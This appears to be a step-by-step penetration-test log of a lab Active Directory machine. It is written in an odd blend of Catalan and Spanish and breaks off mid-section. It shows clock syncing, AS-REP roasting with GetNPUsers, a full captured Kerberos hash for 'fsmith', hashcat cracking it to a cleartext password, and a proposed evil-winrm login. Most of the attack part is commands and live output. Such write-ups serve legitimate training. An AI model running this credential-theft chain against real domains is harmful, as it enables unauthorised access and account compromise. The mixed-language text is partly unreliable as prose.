La llista ja està en un punt molt bo. No merece la pena seguir generando mes variantes perquè, a partir de aquí, añadir més noms només metería soroll.

El que correcte ara no és atacar més forta, sinó preparar bien la següent fase. I la preparación necesaria en aquest cas és revisar el desfasament horari abans de tocar Kerberos.

La razón és important: en Active Directory, Kerberos és molt sensible al temps. Si existeix un `clock skew` gran, una validación posterior pot parecer fallida no perquè el usuari no exista, sinó perquè el temps entre cliente i servidor no encaja. Això falsearía la lectura del cas i haría perder temps.

Así que el següent pas únic cambia ligeramente respecto al que previsto: abans de validar usuaris candidats, convé **comprovar i corregir el desfasament horari**.

**Quina troballa domina ara:** ja existeix una llista prioritzada de usuaris candidats amb calidad suficient per passar a validación.

**Quina branca principal continua activa:** enumeració de Active Directory apoyada per identitats obtingudes des de la web.

**Quines branques secundàries queden anotades:** LDAP anónimo, SMB anónimo i WinRM per una fase posterior si apareixen credencials válidas.

**Quin és el següent pas únic:** verificar i, si fa falta, corregir el desfasament horari del entorn atacant abans de cualquier validación basada en Kerberos.

## commands

```bash id="6q8wte"
date -u
sudo ntpdate -q 10.129.95.180
sudo ntpdate -u 10.129.95.180
date -u
```

Se propone aquest pas perquè la senyal prèvia ja existeix: el reconocimiento inicial dejó indicios de un desfasament temporal important. Abans de usar Kerberos, convé confirmar si aquest problema sigue presente.

Què fa cada ordre:

* `date -u` mostra la hora UTC actual del entorn atacant.
* `sudo ntpdate -q 10.129.95.180` consulta la diferencia horaria respecto al objective sense cambiar encara nada.
* `sudo ntpdate -u 10.129.95.180` corrige la hora usant el objective com referencia, si la consulta confirma que el desfasament és real.
* el último `date -u` permet comprovar el resultat tras la Correcció.

Què se espera obtenir: confirmación clara de si el temps local està desviado i, en cas afirmativo, dejarlo alineado per que la següent fase amb Kerberos sea fiable.

Quina part de la sortida interessa realment: la diferencia de temps reportada per `ntpdate -q` i la Verificació posterior de que la hora va quedar ajustada.

Com canvia la decisió següent: si el desfasament queda corregido, la següent fase podrá centrarse ja en una validación neta de usuaris candidats sense que el temps distorsione els resultats.

## checks

Comprovar si `ntpdate -q` reporta una diferencia significativa.

Si la diferencia és gran, confirmar que el ajuste se aplica correctament amb `ntpdate -u`.

Verificar després que la hora UTC local queda razonablemente alineada amb la del objective.

No passar encara a validación Kerberos fins a dejar aquest punt resuelto.

## writeup_notes

Una vez obtenida una llista prioritzada de usuaris candidats, el següent pas no siempre és lanzar validaciones de identitat de inmediato. En entornos Active Directory, la sincronització temporal forma part de la preparación tècnica del atac, perquè Kerberos depèn de que cliente i servidor compartan una referencia horaria suficientment cercana.

Lliçó reutilitzable: una bona llista de usuaris pot quedar inutilizada per un problema de temps mal interpretado. Abans de concluir que una validación Kerberos falla per usuaris incorrectos, convé descartar primer que el rellotge del entorn atacant esté desalineado.

## Executem el bloc i revisem la sortida

❯ date -u
sudo ntpdate -q 10.129.95.180
sudo ntpdate -u 10.129.95.180
date -u
dijous, 23 d’abril de 2026, 11:44:05 UTC
[sudo] contrasenya per r4mon:
2026-04-23 20:44:15.93361 (+0200) +25202.319033 +/- 0.024418 10.129.95.180 s1 no-leap
2026-04-23 20:44:15.198641 (+0200) +25202.317982 +/- 0.023897 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25202.317982
dijous, 23 d’abril de 2026, 18:44:15 UTC

## objective

Confirmar que el desfasament horari ha quedado corregido i preparar una validación fiable de els usuaris candidats frente a Kerberos, manteniendo una sola branca activa i evitando lecturas erróneas de resultats.

## Fets verificats

El entorn atacant tenia un desfasament horari molt gran respecto al objective.

La consulta de sincronització va mostrar una diferencia aproximada de **25202 segundos**, és dir, unas **7 horas**.

La Correcció se aplicó correctament i el rellotge local va quedar ajustado tras el `time stepped`.

Això convierte el problema temporal en un fet ja resuelto per aquesta fase.

La llista prioritzada de usuaris ja existeix i està llista per ser utilizada com base de validación controlada.

## assumptions

La inferència principal és que, una vez corregido el temps, les pruebas relacionadas amb Kerberos ja no deberían fallar per un problema de sincronització.

La següent hipótesis de trabajo raonable és que entre els 24 usuaris candidats pot existir al menys una compte vàlid del domini i, si alguna no requiere preautenticació Kerberos, aquesta condición debería poder detectarse de forma fiable ara.

Sigue pendent de verificar què convenció de compte usa realment el domini i si alguna de esas comptes presenta una configuración feble aprovechable en Kerberos.

## method

Primer se cierra formalmente la incidencia de temps, perquè ja no té sentido seguir tratándola com hipótesis.

Després se passa a una única Verificació curta i coherente amb la branca activa: comprovar si alguno de els usuaris candidats retorna answer útil en Kerberos sense necesidad de contrasenya.

No se abren encara branques paralelas de SMB, LDAP o WinRM, perquè la evidència actual ja justifica una prueba mes valiosa i més alineada amb la superfície dominant del cas.

## answer

Aquest pas ha sido important i ha salido bien.

La Correcció del rellotge no és un detalle menor: elimina una causa molt seria de falsos negatius en Active Directory. A partir de ara, si una prueba amb Kerberos falla, será molt més probable que falle per identitat incorrecta o per configuración real del domini, i no perquè el temps estuviera roto.

Això cambia clarament la decisió següent. Abans no convenía tocar Kerberos perquè cualquier resultat podía estar contaminado per el desfasament horari. Ara sí té sentido hacerlo.

La branca principal sigue siendo **enumeració de Active Directory apoyada per identitats obtingudes des de la web**. Dentro de aquesta branca, el següent pas únic més net és comprovar si alguno de els usuaris candidats permet obtenir una answer útil mediante una Verificació Kerberos sense contrasenya.

No convé obrir encara otras líneas perquè aquesta ja està bien preparada, té baix coste i pot dar un salto de valor molt alt si apareix una compte amb preautenticació deshabilitada.

**Quina troballa domina ara:** el problema de sincronització temporal ha quedado resuelto i Kerberos ja pot evaluarse amb fiabilidad.

**Quina branca principal continua activa:** enumeració de Active Directory centrada en identitats i validación Kerberos.

**Quines branques secundàries queden anotades:** LDAP anónimo, SMB anónimo i WinRM per una fase posterior si apareixen credencials reutilizables.

**Quin és el següent pas únic:** comprovar si alguno de els usuaris candidats retorna material útil en Kerberos sense necesidad de contrasenya.

## commands

```bash id="0u2m3p"
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames_priority.txt -no-Pass -dc-ip 10.129.95.180
```

Aquest ordre se propone perquè la senyal prèvia ja està madura: hi ha una llista prioritzada de candidats i el problema de temps ja no distorsiona la lectura.

Què fa: prueba cada usuari del fitxer contral controlador de domini i comprueba si alguna compte permet obtenir answer AS-REP sense requerir contrasenya.

Què se espera obtenir: uno de aquests tres escenarios:

1. que alguna compte devuelva material AS-REP útil, el que que convertiría aquesta identitat en troballa dominant;
2. que aparezcan errores de usuari inexistente o answers vacías, el que que ayudaría a depurar la convenció de noms;
3. que no haya comptes amb aquesta configuración, el que que obligaría a reevaluar la següent Verificació de identitat.

Quina part de la sortida interessa realment: els usuaris que devuelvan answer útil i cualquier diferencia clara entre “usuari no válido” i “usuari válido però sense AS-REP aprovechable”.

Com canvia la decisió següent: si apareix una compte amb AS-REP, la cadena avanza per Kerberos; si no apareix ninguna, la següent decisió ja no será “seguir insistiendo igual”, sinó revisar convenció de noms o passar a otra Verificació de identitat.

## checks

Comprovar que el ordre ja no retorna errores compatibles amb desfasament horari.

Revisar si apareix algún usuari amb answer AS-REP clarament diferenciada del resto.

Anotar cualquier nom que produzca una sortida distinta, incluso tot i que no entregue material útil completo, perquè pot servir per validar la convenció real de comptes.

Si no apareix ningún resultat útil, no ampliar encara la llista amb variantes aleatorias; primer convé interpretar bien la sortida obtenida.

## writeup_notes

La correcció del desfasament horari marcó el punt en que la validación Kerberos va passar de ser potencialmente engañosa a ser técnicamente fiable. En un entorn Active Directory, sincronizar el temps no és una tarea auxiliar, sinó una condición prèvia per interpretar correctament els resultats de autenticación.

Lliçó reutilitzable: abans de sacar conclusiones sobre usuaris o answers de Kerberos, convé asegurarse de que el rellotge del entorn atacant està alineado amb el del domini. Un error de temps pot fer parecer inexistente una via que en realidad sigue completamente abierta.

## Executem el bloc i revisem la sortida

❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames_priority.txt -no-pass -dc-ip 10.129.95.180
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

## objective

Interpretar la sortida de `GetNPUsers.py`, separar el que que ja ha quedado demostrado del que que sigue pendent i fijar el següent pas únic sense obrir branques paralelas.

## Fets verificats

La prueba ha producido un resultat útil i concluyente: **`fsmith` és un principal válido del domini** i, a més, **no requiere preautenticació Kerberos**, ja que ha devuelto un **AS-REP roastable hash**.

La convenció **inicial + apellido** queda fuertemente validada per la evidència observada. No se trata ja de una suposició estilística, sinó de una compte real identificada en el domini.

La mayoría de els demás candidats han devuelto `KDC_ERR_C_PRINCIPAL_UNKNOWN`, el que que indica que **no existeixen en la base Kerberos amb esos noms exactos**.

La fase de “derivar identitats des de la web” ja ha dado un fruto operatiu real: no només se va obtenir una llista plausible, sinó una compte vàlid i aprovechable.

## assumptions

La inferència principal és que el següent pas natural ja no és seguir afinando convencions de usuari, sinó **trabajar sobre el hash AS-REP obtenido de `fsmith`**.

També és raonable suponer que, si la compte `fsmith` apareix en aquesta cadena, podria ser un usuari reutilitzable en fases posteriores de accés remot, siempre que la Recuperació offline de la contrasenya tenga éxito.

Sigue pendent de verificar cuál és la contrasenya en clar asociada a `fsmith` i si aquesta credencial será reutilitzable en un servei de accés remot del sistema.

## method

Primer se cierra la etapa de validación de noms de usuari, perquè ja ha cumplido su función: identificar una compte real del domini i encontrar una debilidad concreta en Kerberos.

Després se prioriza una única acción coherente amb aquesta evidència: **preservar el hash i pasarlo a recuperació offline de contrasenya**. No convé volver ara a LDAP, SMB o web, perquè aquesta via ja ha demostrado molt mes valor que les demás.

## answer

Aquest resultat és molt bo.

El hallazgo important no és simplemente que “ha salido alguna cosa”, sinó que la cadena metodològica ha quedado validada de punta a punta:

1. la web expuso noms reals,
2. esos noms permitieron derivar comptes plausibles,
3. la convenció `inicial + apellido` resultó correcta al menys per un cas real,
4. i una de esas comptes, `fsmith`, retorna un AS-REP hash aprovechable.

Això convierte a `fsmith` en el **troballa dominant actual**.

A partir de aquí, seguir generando més usuaris o insistir amb otras variantes tendría menys sentido que abans, perquè ja existeix una via molt més forta abierta. La branca principal deixa de ser “enumeració de identitats” i passa a ser **Kerberos abuse amb material offline ja obtenido**.

El següent pas únic correcte és **guardar el hash de `fsmith` en un fitxer net i tratar la recuperació de la contrasenya com treball offline local del operador**. Aquesta és la transición natural i més ordenada.

**Quina troballa domina ara:** `fsmith` és una compte vàlid del domini i retorna un AS-REP hash explotable offline.

**Quina branca principal continua activa:** abús de Kerberos a partir de una compte identificada per ASREPRoasting.

**Quines branques secundàries queden anotades:** validación posterior de accés remot amb credencials, i només en segundo pla LDAP/SMB si més adelante hicieran falta per context adicional.

**Quin és el següent pas únic:** guardar el hash de `fsmith` en un fitxer dedicado i passar a Recuperació offline de la contrasenya.

## commands

```bash id="p9r4kn"
cat > asrep_fsmith.txt <<'EOF'
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
EOF

wc -l asrep_fsmith.txt
cat asrep_fsmith.txt
```

Se propone aquest pas perquè la evidència útil ja no està en la sortida completa del ordre, sinó en **preservar limpiamente el artefacto valioso**: el hash AS-REP de `fsmith`.

Què fa:

* guardal hash en un fitxer dedicado;
* permet verificar que el fitxer contiene exactamente una línea;
* deixa listo el material per recuperació offline local.

Què se espera obtenir:

* un fitxer net, reutilitzable i sense soroll;
* trazabilidad clara entre hallazgo, artefacto i següent fase.

Quina part de la sortida interessa realment:

* que `wc -l` devuelva `1`;
* que el fitxer contenga només el hash de `fsmith`.

Com canvia la decisió següent:

* una vez guardado correctament, la següent fase ja no será “seguir buscando usuaris”, sinó **recuperar offline la contrasenya asociada a `fsmith`** i volver amb el resultat per interpretar su valor operatiu.

## checks

Confirmar que `asrep_fsmith.txt` contiene una sola línea.

No mezclar en aquest fitxer errores `KDC_ERR_C_PRINCIPAL_UNKNOWN` ni otras sortides del ordre.

Mantenir `usernames_priority.txt` com evidència de la fase de derivació de usuaris i `asrep_fsmith.txt` com artefacto de la fase Kerberos.

Dejar anotado que `fsmith` valida de forma forta la convenció `inicial + apellido`.

## writeup_notes

La fase de derivació de identitats no nomes va permetre construir una llista plausible de usuaris, sinó demostrar cuál era una convenció real del domini. La compte `fsmith` va confirmar el patrón `inicial + apellido` i, a més, va mostrar una configuración de Kerberos feble al devolver un AS-REP hash sense requerir preautenticació.

Lliçó reutilitzable: quan una fase de enumeració produce un usuari real i a més un material criptográfico aprovechable offline, la prioridad ja no ha de ser ampliar llistes de noms, sinó preservar aquest artefacto, tratarlo com evidència central i orientar la següent fase alrededor de él.

## Executem el bloc i revisem la sortida

❯ cat > asrep_fsmith.txt <<'EOF'
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
EOF

wc -l asrep_fsmith.txt
cat asrep_fsmith.txt
1 asrep_fsmith.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: asrep_fsmith.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03
       │ c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556
       │ 394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## objective

Confirmar que el artefacto Kerberos ha quedado guardado correctament i dejar preparada la següent fase local: Recuperació offline de la contrasenya asociada a `fsmith`.

## Fets verificats

El fitxer `asrep_fsmith.txt` se ha creado correctament.

La comprobación amb `wc -l` confirma que el fitxer contiene **una sola línea**, que és exactamente el que que interessa en aquest punt.

El contenido útil del fitxer és el hash AS-REP de `fsmith`, ja aislado i sense soroll adicional.

El salto de línea visual que apareix al mostrar el fitxer no indica que el contenido esté roto; és només ajuste de la visualización en pantalla. Operativamente, el artefacto està bien.

Amb esto, la fase de obtenció i preservación del material AS-REP pot darse per tancada.

## assumptions

La hipótesis de trabajo principal és que la contrasenya de `fsmith` podria ser recuperable mediante atac offline amb diccionari.

També és raonable suponer que, si aquesta contrasenya se recupera, podrá evaluarse després si té valor operatiu en serveis de accés remot del objective.

Encara sigue pendent de verificar si la contrasenya será el que bastante feble com per aparecer en un diccionari común o si hará falta una estrategia local més costosa.

## method

Primer se confirma que el hash útil ha quedado preservado en un fitxer net i reutilitzable.

Després se evita seguir generando més identitats o obrir branques secundàries, perquè la via actual ja ha producido un artefacto de molt mes valor.

El següent pas únic passa a ser treball offline local sobre aquest hash, sense necesidad de volver a interactuar encara amb el domini.

## answer

Aquest punt ha quedado bien fet.

El que important no és només que el fitxer exista, sinó que ara ja hi ha un artefacto net, bien aislado i listo per trabajar fuera de línea. Això mejora molt la trazabilidad del cas: una cosa és la sortida sorollosa del ordre que detectó el AS-REP, i otra molt més útil és tenir el hash central guardado en su propi fitxer.

A partir de aquí, la branca principal deixa de ser “buscar usuaris” i passa a ser **treball offline sobre el hash de `fsmith`**.

No convé volver atrás a LDAP, SMB o més derivació de noms. Aquesta part ja cumplió su función. La evidència dominant ara és molt més forta: existeix una compte vàlid del domini i ja se dispone de material Kerberos recuperable offline.

**Quina troballa domina ara:** `fsmith` és una compte vàlid del domini i su hash AS-REP ja està preservado correctament per treball offline.

**Quina branca principal continua activa:** abús de Kerberos a partir de material obtenido per ASREPRoasting.

**Quines branques secundàries queden anotades:** validación posterior de accés remot si apareix una contrasenya reutilitzable; LDAP i SMB queden en segundo pla.

**Quin és el següent pas únic:** intentar la Recuperació offline de la contrasenya de `fsmith`.

## commands

```bash id="n2v8qa"
hashcat -m 18200 asrep_fsmith.txt /usr/share/wordlists/rockyou.txt -O --outfile cracked_fsmith.txt
cat cracked_fsmith.txt
```

Aquest pas se propone perquè la senyal prèvia ja és suficientment forta: no se trabaja sobre una hipótesis abstracta, sinó sobre un hash AS-REP real ja guardado i net.

Què fa:

* `hashcat -m 18200` usal modo correspondiente a **Kerberos 5 AS-REP etype 23**, que és el formato del hash obtenido.
* `asrep_fsmith.txt` és el artefacto de entrada ja validat.
* `rockyou.txt` actúa com diccionari inicial raonable per una primera recuperació offline.
* `--outfile cracked_fsmith.txt` guardal resultat de forma neta si apareix una coincidencia.
* `cat cracked_fsmith.txt` permet comprovar si se recuperó una contrasenya.

Què se espera obtenir:

* o bien una línea amb el hash i la contrasenya recuperada;
* o bien ningún resultat, el que que indicará que amb aquest diccionari inicial no ha habido éxito.

Quina part de la sortida interessa realment:

* cualquier línea guardada en `cracked_fsmith.txt`;
* i, si no apareix nada, si Hashcat indica simplemente que no encontró coincidencia, no que haya un problema de formato.

Com canvia la decisió següent:

* si apareix una contrasenya, el següent anàlisi se centrará en su valor operatiu;
* si no apareix, no significará que la via haya muerto, sinó que la primera estrategia offline no bastó.

## checks

Confirmar que Hashcat aceptal formato sense errores.

Comprovar si `cracked_fsmith.txt` se crea i contiene una línea útil.

Si no apareix resultat, no modificar encara `asrep_fsmith.txt`; ha de seguir intacto com artefacto base.

Mantenir separados els dos fitxers: uno com evidència original (`asrep_fsmith.txt`) i otro com posible resultat (`cracked_fsmith.txt`).

## writeup_notes

La obtenció de un hash AS-REP només abre la puerta; el punt metodológicamente correcte següent és aislar aquest material i trabajarlo offline, sense mezclarlo amb el soroll de la sortida original. Això convierte un hallazgo puntual en un artefacto tècnic trazable i reutilitzable.

Lliçó reutilitzable: quan una compte vàlid del domini retorna un AS-REP roastable, la prioridad deixa de ser seguir buscando més noms i passa a ser preservar el hash correctament i tratarlo com el centro de la següent fase.

## Executem el bloc i revisem la sortida

❯ hashcat -m 18200 asrep_fsmith.txt /usr/share/wordlists/rockyou.txt -O --outfile cracked_fsmith.txt
cat cracked_fsmith.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2802/5668 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://Hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://Hashcat.net/faq/morework


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bb...929158
Time.Started.....: Thu Apr 23 20:58:17 2026 (7 secs)
Time.Estimated...: Thu Apr 23 20:58:24 2026 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1810.7 kH/s (0.80ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10541059/14344385 (73.49%)
Rejected.........: 2051/10541059 (0.02%)
Restore.Point....: 10536957/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: TiffanyFWright -> TerryJackson
Hardware.Mon.#1..: Util: 11%

Started: Thu Apr 23 20:58:03 2026
Stopped: Thu Apr 23 20:58:25 2026
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cracked_fsmith.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03
       │ c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556
       │ 394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158:Thestrokes23
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

## objective

Interpretar el resultat de la recuperació offline, confirmar el valor operatiu real de la credencial obtenida i fijar un següent pas únic i net dentro de la branca principal del cas.

## Fets verificats

La recuperació offline ha tenido éxito.

La compte **`fsmith`** ja no és només una identitat válida del domini, sinó una compte amb **credencial en clar recuperada**:

* usuari: `fsmith`
* contrasenya: `Thestrokes23`

El hash AS-REP era correcte, el formato usado en Hashcat eral adecuado i el diccionari inicial bastó per recuperar la contrasenya en pocos segundos.

La cadena metodològica queda validada de extremo a extremo:

1. la web pública expuso noms reals;
2. esos noms permitieron derivar usuaris plausibles;
3. la convenció `inicial + apellido` resultó correcta;
4. `fsmith` va retornar un AS-REP hash aprovechable;
5. aquest hash va permetre recuperar una contrasenya en clar.

A més, sigue siendo un Fet verificat que **WinRM està abierto en 5985/tcp**, per el que que ja existeix una via natural de validación de accés remot.

## assumptions

La hipótesis principal és que la credencial `fsmith : Thestrokes23` pot tenir valor operatiu inmediato per accés remot.

La hipótesis més raonable per la següent validación és **WinRM**, no perquè sea la única posibilidad, sinó perquè ja està exposat, és un servei pensado per administración remota i encaja bien amb una comprobación neta de credencials.

Sigue pendent de verificar si aquesta compte té permís efectivo de accés remot o si la contrasenya només será útil per otras fases del cas.

## method

Primer se cierra formalmente la fase de Kerberos offline, perquè ja ha cumplido su función: obtenir una credencial real del domini.

Després se elige una sola Verificació de accés que tenga sentido amb la evidència observada. No se abren a la vez SMB, LDAP i otras rutas, perquè en aquest punt la comprobación més neta i de major valor és una validación controlada sobre WinRM.

## answer

Aquest és un punt de inflexión clar en la màquina.

Fins a ara la branca principal estaba centrada en **identitat + Kerberos**. Des de aquest momento, aquesta fase queda tancada amb éxito i la branca dominant passa a ser **validación de accés remot amb Credencial recuperada**.

El que important no és només que haya aparecido una contrasenya, sinó que ara ja existeix una **credencial completa i reutilitzable**. Això cambia per completo la calidad de la evidència: se deixa atrás la enumeració de candidats i se entra en la fase de accés real.

El següent pas únic correcte és **probar de forma controlada si `fsmith` pot autenticarse per WinRM**. Aquesta decisió té sentido per diverses razones:

* WinRM ja estaba exposat des de la fase 1.
* És una via de administración remota típica en Windows.
* Permet validar rápidamente si la Credencial recuperada té valor práctico inmediato.
* Si funciona, el cas avanza amb una evidència molt forta.
* Si no funciona, no invalida la credencial, només obliga a reinterpretar su alcance.

**Quina troballa domina ara:** se ha recuperado en clar la contrasenya de una compte vàlid del domini: `fsmith : Thestrokes23`.

**Quina branca principal continua activa:** validación de accés remot amb credencial obtenida des de ASREPRoasting.

**Quines branques secundàries queden anotades:** SMB i LDAP siguen com rutas de context secundàries; no dominan mientras exista una credencial completa pendent de validar per WinRM.

**Quin és el següent pas únic:** comprovar si `fsmith` pot autenticarse per WinRM.

## commands

```bash id="7mvq1x"
evil-WinRM -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

Aquest ordre se propone perquè la senyal prèvia ja és molt forta: existeix una credencial completa i un servei de administración remota exposat.

Què fa: intenta autenticarse per WinRM amb la compte recuperada.

Què se espera obtenir:

* o bien una sesión remota válida, el que que convertiríal accés inicial en Fet verificat;
* o bien un fallo de autenticación o de autorización, el que que obligaría a reinterpretar el valor de la credencial sense negar que la contrasenya sea correcta.

Quina part de la sortida interessa realment:

* si la autenticación se completa;
* si apareix prompt remot;
* o, en cas de fallo, si el mensaje indica credencial inválida o falta de permisos per WinRM.

Com canvia la decisió següent:

